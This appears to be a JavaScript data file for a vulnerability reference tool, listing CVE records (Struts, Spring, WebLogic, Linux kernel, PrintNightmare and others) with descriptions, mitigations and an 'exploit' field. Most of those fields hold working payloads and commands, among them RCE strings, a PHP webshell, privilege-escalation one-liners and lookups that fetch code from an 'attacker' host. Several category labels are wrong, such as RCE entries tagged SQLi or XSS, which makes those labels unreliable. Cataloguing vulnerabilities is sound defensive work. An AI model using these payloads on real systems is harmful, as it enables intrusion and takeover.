  { id: 'CVE-2020-17530', name: 'Apache Struts OGNL RCE', severity: 'Critical', cvss: 9.8, published: '2020-12-08', category: 'SQLi', affected: 'Apache Struts 2.0.0 - 2.5.25', description: 'Forced double OGNL evaluation when tag attributes\' values use %{...} syntax and are evaluated again. Attacker can inject OGNL expressions through user input reaching vulnerable tag attributes.', exploit: '%25{(#dm=@ognl.OgnlContext@DEFAULT_MEMBER_ACCESS).(#ct=#request[\'struts.valueStack\'].context).(#cr=#ct[\'com.opensymphony.xwork2.ActionContext.container\']).(#ou=#cr.getInstance(@com.opensymphony.xwork2.ognl.OgnlUtil@class)).(#ou.setExcludedClasses(\'\')).(#ou.setExcludedPackageNames(\'\')).(#dm.setExcludedClasses(\'\')).(#dm.setExcludedPackageNames(\'\')).(#cmd=@java.lang.Runtime@getRuntime().exec(\'id\'))}', mitigation: 'Upgrade to Apache Struts 2.5.26+.', references: ['https://nvd.nist.gov/vuln/detail/CVE-2020-17530'], tags: ['struts', 'java', 'ognl', 'double-evaluation'], platform: 'Cross-platform' },
  { id: 'CVE-2022-22963', name: 'Spring Cloud Function SpEL RCE', severity: 'Critical', cvss: 9.8, published: '2022-03-29', category: 'RCE', affected: 'Spring Cloud Function < 3.1.7, < 3.2.3', description: 'RCE via Spring Expression Language (SpEL) injection through the spring.cloud.function.routing-expression HTTP header. Unauthenticated attackers can execute arbitrary system commands.', exploit: 'curl -X POST http://target/functionRouter -H "spring.cloud.function.routing-expression:T(java.lang.Runtime).getRuntime().exec(\'id\')" -d "data"', mitigation: 'Upgrade to Spring Cloud Function 3.1.7+ or 3.2.3+.', references: ['https://nvd.nist.gov/vuln/detail/CVE-2022-22963'], tags: ['spring', 'java', 'spel', 'expression-language'], platform: 'Cross-platform' },
  { id: 'CVE-2019-10758', name: 'mongo-express RCE', severity: 'Critical', cvss: 9.8, published: '2019-10-08', category: 'SQLi', affected: 'mongo-express < 0.54.0', description: 'Remote code execution in mongo-express web interface via BSON object injection in document updates. Authenticated users can inject server-side JavaScript through crafted BSON data.', exploit: 'In document update, inject: {"$gt": "".__proto__.constructor("return process.mainModule.require(\'child_process\').execSync(\'id\');")}', mitigation: 'Upgrade to mongo-express 0.54.0+, restrict access to trusted users.', references: ['https://nvd.nist.gov/vuln/detail/CVE-2019-10758'], tags: ['mongodb', 'mongo-express', 'nosql', 'bson'], platform: 'Cross-platform' },

  // ── XSS (15) ───────────────────────────────────────────────
  { id: 'CVE-2023-36884', name: 'Office/Windows HTML RCE', severity: 'High', cvss: 8.8, published: '2023-07-11', category: 'XSS', affected: 'Microsoft Office 2013-2021, Windows 10/11', description: 'RCE via crafted Office documents using Windows Search and HTML. Storm-0978 (RomCom) exploited this zero-day via specially crafted documents delivered through phishing.', exploit: 'Crafted .docx with embedded HTML that triggers Windows Search protocol handler for RCE', mitigation: 'Apply Microsoft patches, set FEATURE_BLOCK_CROSS_PROTOCOL_FILE_NAVIGATION registry key.', references: ['https://nvd.nist.gov/vuln/detail/CVE-2023-36884'], tags: ['office', 'windows', 'html', 'zero-day', 'romcom'], platform: 'Windows' },
  { id: 'CVE-2020-11022', name: 'jQuery XSS', severity: 'Medium', cvss: 6.1, published: '2020-04-29', category: 'XSS', affected: 'jQuery >= 1.2, < 3.5.0', description: 'Cross-site scripting via passing HTML containing <option> elements from untrusted sources to jQuery DOM manipulation methods (.html(), .append(), etc.). Even after sanitizing, certain HTML can execute code.', exploit: '<option><style></option></select><img src=x onerror=alert(1)></style>', mitigation: 'Upgrade to jQuery 3.5.0+, use .text() instead of .html() for untrusted content.', references: ['https://nvd.nist.gov/vuln/detail/CVE-2020-11022'], tags: ['jquery', 'javascript', 'dom', 'frontend'], platform: 'Web' },
  { id: 'CVE-2022-29078', name: 'EJS Template Injection', severity: 'Critical', cvss: 9.8, published: '2022-04-25', category: 'XSS', affected: 'EJS (Embedded JavaScript) < 3.1.7', description: 'Server-side template injection via settings/options object pollution in EJS. Attacker can inject arbitrary code through the view options parameter, achieving RCE on the server.', exploit: 'GET /page?settings[view%20options][outputFunctionName]=x;process.mainModule.require(\'child_process\').execSync(\'id\');s', mitigation: 'Upgrade EJS to 3.1.7+, validate and sanitize all user input passed to template rendering.', references: ['https://nvd.nist.gov/vuln/detail/CVE-2022-29078'], tags: ['ejs', 'nodejs', 'template-injection', 'ssti'], platform: 'Cross-platform' },
  { id: 'CVE-2021-41184', name: 'jQuery UI XSS', severity: 'Medium', cvss: 6.1, published: '2021-10-26', category: 'XSS', affected: 'jQuery UI < 1.13.0', description: 'XSS vulnerability in the jQuery UI Datepicker widget. The altField option did not properly sanitize values, allowing injection of malicious HTML when user-controllable values were used.', exploit: '<img src=x onerror=alert(1)> as altField value', mitigation: 'Upgrade to jQuery UI 1.13.0+.', references: ['https://nvd.nist.gov/vuln/detail/CVE-2021-41184'], tags: ['jquery-ui', 'javascript', 'datepicker', 'dom'], platform: 'Web' },
  { id: 'CVE-2018-16487', name: 'Lodash Prototype Pollution', severity: 'Critical', cvss: 9.8, published: '2019-02-01', category: 'XSS', affected: 'Lodash < 4.17.11', description: 'Prototype pollution in Lodash merge, mergeWith, and defaultsDeep functions. Attackers can inject properties into Object.prototype affecting all objects, leading to XSS, DoS, or privilege escalation.', exploit: 'const payload = JSON.parse(\'{"__proto__":{"polluted":"yes"}}\');\n_.merge({}, payload);\nconsole.log({}.polluted); // "yes"', mitigation: 'Upgrade Lodash to 4.17.12+, freeze Object.prototype, validate merge sources.', references: ['https://nvd.nist.gov/vuln/detail/CVE-2018-16487'], tags: ['lodash', 'javascript', 'prototype-pollution', 'npm'], platform: 'Cross-platform' },
  { id: 'CVE-2019-11358', name: 'jQuery Prototype Pollution', severity: 'Medium', cvss: 6.1, published: '2019-04-19', category: 'XSS', affected: 'jQuery < 3.4.0', description: 'Prototype pollution in jQuery $.extend() when handling deep copy of objects. Malicious Object.prototype properties can be injected through nested objects passed to $.extend(true, ...).', exploit: '$.extend(true, {}, JSON.parse(\'{"__proto__": {"devMode": true}}\'))', mitigation: 'Upgrade to jQuery 3.4.0+.', references: ['https://nvd.nist.gov/vuln/detail/CVE-2019-11358'], tags: ['jquery', 'javascript', 'prototype-pollution'], platform: 'Web' },
  { id: 'CVE-2022-24785', name: 'Moment.js Path Traversal', severity: 'High', cvss: 7.5, published: '2022-04-04', category: 'XSS', affected: 'Moment.js < 2.29.2', description: 'Path traversal vulnerability in moment.locale() when user-controlled locale names are used. Attackers can load arbitrary files from the filesystem by manipulating locale identifiers.', exploit: 'moment.locale("../../../../etc/passwd")', mitigation: 'Upgrade to Moment.js 2.29.2+, validate locale names, consider migrating to day.js or Luxon.', references: ['https://nvd.nist.gov/vuln/detail/CVE-2022-24785'], tags: ['momentjs', 'javascript', 'path-traversal', 'npm'], platform: 'Cross-platform' },
  { id: 'CVE-2023-29489', name: 'cPanel XSS', severity: 'Medium', cvss: 6.1, published: '2023-04-27', category: 'XSS', affected: 'cPanel < 11.109.9999.116', description: 'Reflected XSS in cPanel via the cpsrvd error page. Unauthenticated attackers can execute JavaScript on any cPanel port (2080, 2082, 2083, 2086). Affects millions of web hosting servers.', exploit: 'https://target:2083/cpanelwebcall/<img%20src=x%20onerror="alert(1)">', mitigation: 'Update cPanel to latest version via /scripts/upcp.', references: ['https://nvd.nist.gov/vuln/detail/CVE-2023-29489'], tags: ['cpanel', 'hosting', 'reflected-xss', 'web'], platform: 'Web' },
  { id: 'CVE-2023-50164', name: 'Apache Struts File Upload RCE', severity: 'Critical', cvss: 9.8, published: '2023-12-07', category: 'RCE', affected: 'Apache Struts 2.x < 2.5.33, 6.x < 6.3.0.2', description: 'Path traversal vulnerability in file upload logic allowing arbitrary file write and remote code execution. Manipulating file upload parameters can traverse directories to write webshells.', exploit: 'Manipulate upload parameter name to include path traversal: ../../../webapps/ROOT/shell.jsp', mitigation: 'Upgrade to Struts 2.5.33 or 6.3.0.2+.', references: ['https://nvd.nist.gov/vuln/detail/CVE-2023-50164'], tags: ['struts', 'java', 'file-upload', 'path-traversal'], platform: 'Cross-platform' },
  { id: 'CVE-2020-7961', name: 'Liferay Portal RCE', severity: 'Critical', cvss: 9.8, published: '2020-03-20', category: 'XSS', affected: 'Liferay Portal < 7.2.1 CE GA2', description: 'Pre-authentication RCE via JSON web services deserialization in Liferay Portal. Attacker can exploit the Liferay JSON web service API to deserialize arbitrary Java objects.', exploit: 'POST /api/jsonws/invoke\nContent-Type: application/json\n\n[{"...deserialization_payload..."}]', mitigation: 'Upgrade Liferay Portal, restrict access to /api/jsonws endpoint.', references: ['https://nvd.nist.gov/vuln/detail/CVE-2020-7961'], tags: ['liferay', 'java', 'deserialization', 'json'], platform: 'Cross-platform' },
  { id: 'CVE-2021-23337', name: 'Lodash Template Injection', severity: 'High', cvss: 7.2, published: '2021-02-15', category: 'XSS', affected: 'Lodash < 4.17.21', description: 'Command injection via template function when variable option is a user-controlled value. If the sourceURL option is set, attackers can inject arbitrary code through the variable parameter.', exploit: '_.template("", { variable: ") ; return require(\'child_process\').execSync(\'id\'); var t = (" })', mitigation: 'Upgrade to Lodash 4.17.21+, never use user input as template variable name.', references: ['https://nvd.nist.gov/vuln/detail/CVE-2021-23337'], tags: ['lodash', 'javascript', 'template-injection', 'npm'], platform: 'Cross-platform' },
  { id: 'CVE-2019-16278', name: 'Nostromo RCE', severity: 'Critical', cvss: 9.8, published: '2019-10-14', category: 'RCE', affected: 'nostromo nhttpd < 1.9.7', description: 'Directory traversal and RCE in Nostromo web server. Path traversal via crafted HTTP request bypasses access controls and allows execution of arbitrary commands via shell metacharacters.', exploit: 'curl -X POST "http://target/.%0d./.%0d./.%0d./bin/sh" -d "/bin/id"', mitigation: 'Upgrade to nostromo 1.9.7+.', references: ['https://nvd.nist.gov/vuln/detail/CVE-2019-16278'], tags: ['nostromo', 'web-server', 'path-traversal'], platform: 'Linux' },
  { id: 'CVE-2020-24186', name: 'WordPress wpDiscuz RCE', severity: 'Critical', cvss: 10.0, published: '2020-07-30', category: 'XSS', affected: 'WordPress wpDiscuz < 7.0.5', description: 'Unauthenticated arbitrary file upload in wpDiscuz WordPress plugin. Attackers can upload PHP files disguised as images and execute arbitrary code on the server.', exploit: 'Upload PHP webshell as comment attachment with GIF header bypass: GIF89a; <?php system($_GET["cmd"]); ?>', mitigation: 'Update wpDiscuz to 7.0.5+, implement proper file type validation.', references: ['https://nvd.nist.gov/vuln/detail/CVE-2020-24186'], tags: ['wordpress', 'php', 'file-upload', 'plugin'], platform: 'Web' },
  { id: 'CVE-2022-21661', name: 'WordPress WP_Query SQLi', severity: 'High', cvss: 7.5, published: '2022-01-06', category: 'SQLi', affected: 'WordPress < 5.8.3', description: 'SQL injection via WP_Query class in WordPress core. Through the posts query, attackers who can submit WP_Query arguments can inject SQL via specific term query parameters.', exploit: 'POST with tax_query[0][terms][0]=1) OR 1=1 UNION SELECT ... in WP_Query arguments', mitigation: 'Update WordPress to 5.8.3+.', references: ['https://nvd.nist.gov/vuln/detail/CVE-2022-21661'], tags: ['wordpress', 'php', 'cms', 'wp-query'], platform: 'Web' },

  // ── Auth Bypass / Privilege Escalation (22) ────────────────
  { id: 'CVE-2022-0847', name: 'DirtyPipe', severity: 'High', cvss: 7.8, published: '2022-03-07', category: 'Privilege Escalation', affected: 'Linux kernel 5.8 - 5.16.11, 5.15.25, 5.10.102', description: 'Linux kernel vulnerability allowing unprivileged users to overwrite data in read-only files by exploiting a flaw in the pipe subsystem. Can overwrite /etc/passwd, SUID binaries, or container files.', exploit: 'gcc exploit.c -o exploit && ./exploit /etc/passwd 1 "${openssl_hash}"\n# Overwrites root password hash in /etc/passwd', mitigation: 'Update Linux kernel to 5.16.11+, 5.15.25+, or 5.10.102+.', references: ['https://nvd.nist.gov/vuln/detail/CVE-2022-0847'], tags: ['linux', 'kernel', 'pipe', 'local-privesc', 'file-overwrite'], platform: 'Linux' },
  { id: 'CVE-2016-5195', name: 'DirtyCow', severity: 'High', cvss: 7.8, published: '2016-10-19', category: 'Privilege Escalation', affected: 'Linux kernel 2.6.22 - 4.8.3', description: 'Race condition in Linux kernel memory subsystem handling of copy-on-write (COW) breakage of private read-only memory mappings. Allows local privilege escalation to root by writing to read-only memory.', exploit: 'gcc -pthread dirtyc0w.c -o dirtyc0w -lcrypt\n./dirtyc0w /etc/passwd "root::0:0:root:/root:/bin/bash"', mitigation: 'Update Linux kernel, apply vendor patches, use seccomp or SELinux.', references: ['https://nvd.nist.gov/vuln/detail/CVE-2016-5195'], tags: ['linux', 'kernel', 'cow', 'race-condition', 'local-privesc'], platform: 'Linux' },
  { id: 'CVE-2021-4034', name: 'PwnKit', severity: 'High', cvss: 7.8, published: '2022-01-25', category: 'Privilege Escalation', affected: 'Polkit pkexec (all Linux distributions)', description: 'Local privilege escalation in pkexec (Polkit) by exploiting memory corruption when invoked with zero arguments. Present in all major Linux distributions for 12+ years. Trivially exploitable.', exploit: 'gcc cve-2021-4034.c -o pwnkit && ./pwnkit\n# Instant root shell on any unpatched Linux system', mitigation: 'Apply vendor security updates, or chmod 0755 /usr/bin/pkexec as temporary mitigation.', references: ['https://nvd.nist.gov/vuln/detail/CVE-2021-4034'], tags: ['linux', 'polkit', 'pkexec', 'local-privesc', 'memory-corruption'], platform: 'Linux' },
  { id: 'CVE-2019-14287', name: 'Sudo Bypass', severity: 'High', cvss: 8.8, published: '2019-10-14', category: 'Privilege Escalation', affected: 'sudo < 1.8.28', description: 'Sudo security bypass when a user is allowed to run commands as any user except root. Running with UID -1 or 4294967295 causes integer overflow, executing the command as root.', exploit: 'sudo -u#-1 /bin/bash\nsudo -u#4294967295 id', mitigation: 'Upgrade sudo to 1.8.28 or later.', references: ['https://nvd.nist.gov/vuln/detail/CVE-2019-14287'], tags: ['sudo', 'linux', 'integer-overflow', 'bypass'], platform: 'Linux' },
  { id: 'CVE-2022-0185', name: 'Linux Kernel FSConfig', severity: 'High', cvss: 8.4, published: '2022-02-11', category: 'Privilege Escalation', affected: 'Linux kernel 5.1 - 5.16.2', description: 'Heap-based buffer overflow in Linux kernel legacy_parse_param function when handling filesystem context parameters. Can escape containers and gain root on host system.', exploit: 'Overflow via oversized fsconfig() parameter: unshare + fsconfig syscall chain', mitigation: 'Update kernel, disable unprivileged user namespaces (sysctl kernel.unprivileged_userns_clone=0).', references: ['https://nvd.nist.gov/vuln/detail/CVE-2022-0185'], tags: ['linux', 'kernel', 'heap-overflow', 'container-escape'], platform: 'Linux' },
  { id: 'CVE-2023-32233', name: 'Linux nf_tables Use-After-Free', severity: 'High', cvss: 7.8, published: '2023-05-08', category: 'Privilege Escalation', affected: 'Linux kernel < 6.3.2 (nf_tables)', description: 'Use-after-free vulnerability in nf_tables component of Linux kernel Netfilter subsystem. Local attackers can exploit anonymous sets handling to achieve arbitrary read/write in kernel memory.', exploit: 'Exploit anonymous set element removal race in nf_tables for arbitrary kernel read/write', mitigation: 'Update to Linux kernel 6.3.2+, disable nf_tables if not needed.', references: ['https://nvd.nist.gov/vuln/detail/CVE-2023-32233'], tags: ['linux', 'kernel', 'netfilter', 'use-after-free', 'nftables'], platform: 'Linux' },
  { id: 'CVE-2021-22555', name: 'Netfilter Heap OOB Write', severity: 'High', cvss: 7.8, published: '2021-07-07', category: 'Privilege Escalation', affected: 'Linux kernel 2.6.19 - 5.12', description: 'Heap out-of-bounds write in Netfilter x_tables compat layer in the Linux kernel. Allows unprivileged users to gain root access and escape containers by corrupting kernel heap objects.', exploit: 'int sock = socket(AF_INET, SOCK_DGRAM, 0);\nsetsockopt(sock, SOL_IP, IPT_SO_SET_REPLACE, &exploit_data, sizeof(exploit_data));', mitigation: 'Update Linux kernel, disable compat iptables if possible.', references: ['https://nvd.nist.gov/vuln/detail/CVE-2021-22555'], tags: ['linux', 'kernel', 'netfilter', 'heap-overflow', 'container-escape'], platform: 'Linux' },
  { id: 'CVE-2023-38408', name: 'OpenSSH Agent Forwarding RCE', severity: 'Critical', cvss: 9.8, published: '2023-07-19', category: 'RCE', affected: 'OpenSSH < 9.3p2', description: 'RCE via ssh-agent forwarding when connecting to attacker-controlled SSH server. A malicious server can exploit PKCS#11 provider loading in ssh-agent to execute arbitrary code on the client machine.', exploit: 'Attacker-controlled SSH server loads crafted PKCS#11 .so library via forwarded agent', mitigation: 'Update OpenSSH to 9.3p2+, avoid using ssh-agent forwarding to untrusted hosts, use ProxyJump instead.', references: ['https://nvd.nist.gov/vuln/detail/CVE-2023-38408'], tags: ['openssh', 'ssh', 'agent-forwarding', 'pkcs11'], platform: 'Cross-platform' },
  { id: 'CVE-2024-1709', name: 'ScreenConnect Auth Bypass', severity: 'Critical', cvss: 10.0, published: '2024-02-19', category: 'Auth Bypass', affected: 'ConnectWise ScreenConnect < 23.9.8', description: 'Authentication bypass via alternate path in ScreenConnect setup wizard. Attackers can access the setup wizard after initial setup to create admin accounts and achieve RCE. Trivially exploitable.', exploit: 'Navigate to /SetupWizard.aspx after setup is complete — creates new admin account', mitigation: 'Update to ScreenConnect 23.9.8+, restrict access to ScreenConnect server.', references: ['https://nvd.nist.gov/vuln/detail/CVE-2024-1709'], tags: ['screenconnect', 'connectwise', 'setup-wizard', 'rmm'], platform: 'Windows' },
  { id: 'CVE-2024-23897', name: 'Jenkins CLI Arbitrary File Read', severity: 'Critical', cvss: 9.8, published: '2024-01-24', category: 'Info Disclosure', affected: 'Jenkins < 2.442, LTS < 2.426.3', description: 'Arbitrary file read via Jenkins CLI argument parsing. The args4j library used by Jenkins CLI replaces @ character followed by a filepath with the file contents, allowing unauthenticated file reads and potential RCE.', exploit: 'java -jar jenkins-cli.jar -s http://target:8080/ who-am-i @/etc/passwd', mitigation: 'Upgrade Jenkins, disable CLI if not needed, restrict CLI access.', references: ['https://nvd.nist.gov/vuln/detail/CVE-2024-23897'], tags: ['jenkins', 'java', 'file-read', 'cli', 'args4j'], platform: 'Cross-platform' },
  { id: 'CVE-2023-25690', name: 'Apache mod_proxy SSRF', severity: 'Critical', cvss: 9.8, published: '2023-03-07', category: 'SSRF', affected: 'Apache HTTP Server 2.4.0 - 2.4.55', description: 'HTTP request splitting/smuggling via mod_proxy and mod_rewrite. When RewriteRule and ProxyPassMatch are used together, certain input patterns can cause request splitting enabling SSRF.', exploit: 'GET /endpoint%20HTTP/1.1%0d%0aHost:%20internal-server%0d%0a%0d%0aGET%20/secret HTTP/1.1', mitigation: 'Upgrade to Apache 2.4.56+.', references: ['https://nvd.nist.gov/vuln/detail/CVE-2023-25690'], tags: ['apache', 'mod_proxy', 'request-smuggling', 'ssrf'], platform: 'Cross-platform' },
  { id: 'CVE-2023-4966', name: 'Citrix Bleed', severity: 'Critical', cvss: 9.4, published: '2023-10-10', category: 'Auth Bypass', affected: 'Citrix NetScaler ADC/Gateway 13.x, 14.x', description: 'Buffer overflow leading to sensitive information disclosure in Citrix NetScaler. Leaks session tokens allowing session hijacking, bypassing MFA. Exploited by LockBit ransomware gang.', exploit: 'Send oversized Host header to /oauth/idp/.well-known/openid-configuration to leak session tokens from memory', mitigation: 'Apply Citrix patches, kill all active sessions after patching, rotate credentials.', references: ['https://nvd.nist.gov/vuln/detail/CVE-2023-4966'], tags: ['citrix', 'netscaler', 'session-hijack', 'buffer-overflow', 'lockbit'], platform: 'Network' },
  { id: 'CVE-2023-20198', name: 'Cisco IOS XE Implant', severity: 'Critical', cvss: 10.0, published: '2023-10-16', category: 'Auth Bypass', affected: 'Cisco IOS XE with Web UI enabled', description: 'Authentication bypass in Cisco IOS XE Web UI allowing unauthenticated privilege level 15 account creation. Chained with CVE-2023-20273 to implant malicious code. Over 40,000 devices compromised.', exploit: 'POST /webui/logoutconfirm.html HTTP/1.1 — creates privilege 15 local account\ncurl -k "https://target/webui/logoutconfirm.html?logon_hash=1"', mitigation: 'Disable HTTP/HTTPS server, upgrade IOS XE, check for implant IOCs.', references: ['https://nvd.nist.gov/vuln/detail/CVE-2023-20198'], tags: ['cisco', 'ios-xe', 'web-ui', 'implant', 'network'], platform: 'Network' },
  { id: 'CVE-2021-1675', name: 'PrintNightmare', severity: 'High', cvss: 8.8, published: '2021-06-08', category: 'Privilege Escalation', affected: 'Windows Print Spooler (all versions)', description: 'RCE and LPE via Windows Print Spooler service. Authenticated users can remotely load malicious DLLs via AddPrinterDriverEx() to execute code as SYSTEM. Named PrintNightmare.', exploit: 'python3 CVE-2021-1675.py domain/user:password@target \'\\\\attacker\\share\\evil.dll\'', mitigation: 'Disable Print Spooler service, apply patches, restrict Point and Print.', references: ['https://nvd.nist.gov/vuln/detail/CVE-2021-1675'], tags: ['windows', 'print-spooler', 'dll-loading', 'active-directory'], platform: 'Windows' },
  { id: 'CVE-2022-26923', name: 'AD Certificate Services Privesc', severity: 'High', cvss: 8.8, published: '2022-05-10', category: 'Privilege Escalation', affected: 'Active Directory Certificate Services (Windows Server)', description: 'Domain privilege escalation via Active Directory Certificate Services. User who can enroll certificates can manipulate the subject alternative name to impersonate other users including Domain Admins.', exploit: 'certipy req -u user@domain -p password -ca CA-Name -template User -upn administrator@domain', mitigation: 'Apply May 2022 patches, audit certificate templates, enable strong mapping enforcement.', references: ['https://nvd.nist.gov/vuln/detail/CVE-2022-26923'], tags: ['windows', 'active-directory', 'adcs', 'certificate', 'domain-privesc'], platform: 'Windows' },
  { id: 'CVE-2023-22809', name: 'Sudo sudoedit Bypass', severity: 'High', cvss: 7.8, published: '2023-01-18', category: 'Privilege Escalation', affected: 'sudo 1.8.0 - 1.9.12p1', description: 'Sudoedit bypass via user-supplied EDITOR containing -- argument. Allows editing of arbitrary files when a user is permitted to edit specific files via sudoedit policy.', exploit: 'EDITOR="vim -- /etc/sudoers" sudoedit /allowed/file', mitigation: 'Upgrade sudo to 1.9.12p2+, restrict sudoedit policies.', references: ['https://nvd.nist.gov/vuln/detail/CVE-2023-22809'], tags: ['sudo', 'linux', 'editor', 'policy-bypass'], platform: 'Linux' },
  { id: 'CVE-2022-30190', name: 'Follina (MSDT RCE)', severity: 'High', cvss: 7.8, published: '2022-05-30', category: 'RCE', affected: 'Windows 7/8.1/10/11, Server 2008-2022', description: 'RCE via Microsoft Support Diagnostic Tool (MSDT) invoked from Office documents. Crafted URL protocol handler in .docx triggers ms-msdt: scheme to execute PowerShell commands without macros.', exploit: 'ms-msdt:/id PCWDiagnostic /skip force /param "IT_RebsowseForFile=cal]c IT_LaunchMethod=ContextMenu IT_SelectProgram=NotListed IT_BrowseForFile=$(Invoke-Expression(...))"', mitigation: 'Disable MSDT URL protocol (reg delete HKCR\\ms-msdt), apply patches.', references: ['https://nvd.nist.gov/vuln/detail/CVE-2022-30190'], tags: ['windows', 'msdt', 'office', 'url-protocol', 'no-macros'], platform: 'Windows' },
  { id: 'CVE-2021-36260', name: 'Hikvision Command Injection', severity: 'Critical', cvss: 9.8, published: '2021-09-18', category: 'RCE', affected: 'Hikvision IP cameras (multiple models)', description: 'Unauthenticated command injection in Hikvision IP cameras via crafted HTTP requests. Attackers can fully control the camera, access video feeds, and use compromised devices as botnet nodes.', exploit: 'PUT /SDK/webLanguage HTTP/1.1\n\n<?xml version="1.0" encoding="UTF-8"?><language>$(id)</language>', mitigation: 'Apply Hikvision firmware updates, isolate cameras on separate VLAN, change default credentials.', references: ['https://nvd.nist.gov/vuln/detail/CVE-2021-36260'], tags: ['hikvision', 'iot', 'camera', 'command-injection', 'pre-auth'], platform: 'IoT' },
  { id: 'CVE-2022-37042', name: 'Zimbra Auth Bypass + RCE', severity: 'Critical', cvss: 9.8, published: '2022-08-11', category: 'Auth Bypass', affected: 'Zimbra Collaboration Suite < 8.8.15 P33, < 9.0.0 P26', description: 'Authentication bypass via amavisd component allowing unauthenticated access to internal endpoints. Chained with arbitrary file upload for complete server compromise.', exploit: 'POST /service/extension/backup/mboximport?account-name=admin@target&ow=cmd HTTP/1.1\n\nUpload malicious ZIP to execute commands', mitigation: 'Apply Zimbra patches, restrict access to admin ports.', references: ['https://nvd.nist.gov/vuln/detail/CVE-2022-37042'], tags: ['zimbra', 'email', 'auth-bypass', 'file-upload'], platform: 'Linux' },

  // ── Deserialization (10) ───────────────────────────────────
  { id: 'CVE-2015-4852', name: 'WebLogic Deserialization', severity: 'Critical', cvss: 9.8, published: '2015-11-18', category: 'Deserialization', affected: 'Oracle WebLogic Server 10.3.6, 12.1.x, 12.2.x', description: 'Java deserialization of untrusted data via T3 protocol in WebLogic Server. Attackers send crafted serialized Java objects to execute arbitrary code on the server. Foundational deserialization research by Foxglove Security.', exploit: 'java -jar ysoserial.jar CommonsCollections1 "touch /tmp/pwned" | ncat target 7001', mitigation: 'Apply Oracle patches, filter T3 protocol access, use JEP 290 deserialization filtering.', references: ['https://nvd.nist.gov/vuln/detail/CVE-2015-4852'], tags: ['weblogic', 'java', 't3', 'ysoserial', 'commons-collections'], platform: 'Cross-platform' },
  { id: 'CVE-2017-9805', name: 'Struts REST Deserialization', severity: 'High', cvss: 8.1, published: '2017-09-05', category: 'Deserialization', affected: 'Apache Struts 2.1.2 - 2.3.33, 2.5 - 2.5.12', description: 'Remote code execution via XML deserialization in Struts REST plugin using XStream. Crafted XML payload triggers arbitrary code execution through XStream deserialization gadgets.', exploit: 'Content-Type: application/xml\n\n<map><entry><jdk.nashorn.internal.objects.NativeString>...exec("id")...</jdk.nashorn.internal.objects.NativeString></entry></map>', mitigation: 'Upgrade Struts, disable REST plugin or restrict content types.', references: ['https://nvd.nist.gov/vuln/detail/CVE-2017-9805'], tags: ['struts', 'java', 'xstream', 'xml', 'rest'], platform: 'Cross-platform' },
  { id: 'CVE-2019-2725', name: 'WebLogic SOAP Deserialization', severity: 'Critical', cvss: 9.8, published: '2019-04-26', category: 'Deserialization', affected: 'Oracle WebLogic Server 10.3.6, 12.1.3', description: 'Deserialization RCE in WebLogic via /_async/AsyncResponseService and /wls-wsat/* endpoints. Exploits bypass previous deserialization patches using new gadget chains.', exploit: 'POST /_async/AsyncResponseService HTTP/1.1\nContent-Type: text/xml\n\n<soapenv:Envelope>...<java class="java.beans.XMLDecoder">...Runtime.exec("id")...</java>...', mitigation: 'Apply Oracle patches, block access to /_async/ and /wls-wsat/ endpoints.', references: ['https://nvd.nist.gov/vuln/detail/CVE-2019-2725'], tags: ['weblogic', 'java', 'soap', 'xmldecoder'], platform: 'Cross-platform' },
  { id: 'CVE-2020-36188', name: 'Jackson Databind Deserialization', severity: 'High', cvss: 8.1, published: '2021-01-06', category: 'Deserialization', affected: 'Jackson-databind < 2.9.10.8', description: 'Unsafe deserialization via polymorphic type handling in Jackson-databind. Multiple gadget classes (newrelic-agent, com.pastdev.httpcomponents) enable arbitrary code execution when default typing is enabled.', exploit: '["com.newrelic.agent.deps.ch.qos.logback.core.db.JNDIConnectionSource",{"jndiLocation":"ldap://attacker/a"}]', mitigation: 'Upgrade Jackson-databind, disable default typing, use @JsonTypeInfo with explicit subtypes.', references: ['https://nvd.nist.gov/vuln/detail/CVE-2020-36188'], tags: ['jackson', 'java', 'json', 'polymorphic-typing'], platform: 'Cross-platform' },
  { id: 'CVE-2016-4437', name: 'Apache Shiro Deserialization', severity: 'High', cvss: 8.1, published: '2016-06-03', category: 'Deserialization', affected: 'Apache Shiro < 1.2.5', description: 'Java deserialization RCE in Apache Shiro via the "remember me" cookie. The default encryption key is well-known, allowing attackers to craft malicious serialized objects in the cookie.', exploit: 'python3 shiro_exploit.py -u http://target -k kPH+bIxk5D2deZiIxcaaaA== -g CommonsCollections2 -c "id"', mitigation: 'Upgrade Apache Shiro, change the default rememberMe encryption key.', references: ['https://nvd.nist.gov/vuln/detail/CVE-2016-4437'], tags: ['shiro', 'java', 'cookie', 'remember-me', 'default-key'], platform: 'Cross-platform' },
  { id: 'CVE-2020-9484', name: 'Tomcat Session Deserialization', severity: 'High', cvss: 7.0, published: '2020-05-20', category: 'Deserialization', affected: 'Apache Tomcat < 10.0.0-M5, < 9.0.35, < 8.5.55, < 7.0.104', description: 'RCE via session persistence using FileStore with a crafted session file. If attacker can control the contents of a file on the server, they can achieve code execution through Java deserialization.', exploit: 'curl "http://target/app" -H "Cookie: JSESSIONID=../../../../../tmp/malicious"', mitigation: 'Upgrade Tomcat, avoid using FileStore for session persistence.', references: ['https://nvd.nist.gov/vuln/detail/CVE-2020-9484'], tags: ['tomcat', 'java', 'session', 'filestore'], platform: 'Cross-platform' },
  { id: 'CVE-2017-12149', name: 'JBoss Deserialization', severity: 'Critical', cvss: 9.8, published: '2017-09-08', category: 'Deserialization', affected: 'JBoss EAP < 7.0 (JBoss AS 5/6)', description: 'Remote code execution in JBoss Application Server via HTTP Invoker/ReadOnlyAccessFilter. Unauthenticated deserialization endpoint at /invoker/readonly allows arbitrary code execution.', exploit: 'curl http://target/invoker/readonly --data-binary @ysoserial_payload.ser', mitigation: 'Upgrade to JBoss EAP 7+, remove or restrict /invoker/ endpoints.', references: ['https://nvd.nist.gov/vuln/detail/CVE-2017-12149'], tags: ['jboss', 'java', 'invoker', 'http'], platform: 'Cross-platform' },
  { id: 'CVE-2019-12384', name: 'Jackson SSRF/RCE via H2', severity: 'High', cvss: 5.9, published: '2019-06-24', category: 'Deserialization', affected: 'Jackson-databind < 2.9.9.1', description: 'SSRF and potential RCE via Jackson-databind polymorphic deserialization using the H2 database JDBC URL. When combined with H2\'s INIT=RUNSCRIPT feature, achieves code execution.', exploit: '["org.h2.jdbcx.JdbcDataSource",{"url":"jdbc:h2:mem:;INIT=RUNSCRIPT FROM \'http://attacker/inject.sql\'"}]', mitigation: 'Upgrade Jackson-databind, remove H2 from classpath in production, disable default typing.', references: ['https://nvd.nist.gov/vuln/detail/CVE-2019-12384'], tags: ['jackson', 'java', 'h2', 'jdbc', 'ssrf'], platform: 'Cross-platform' },

  // ── SSRF (10) ──────────────────────────────────────────────
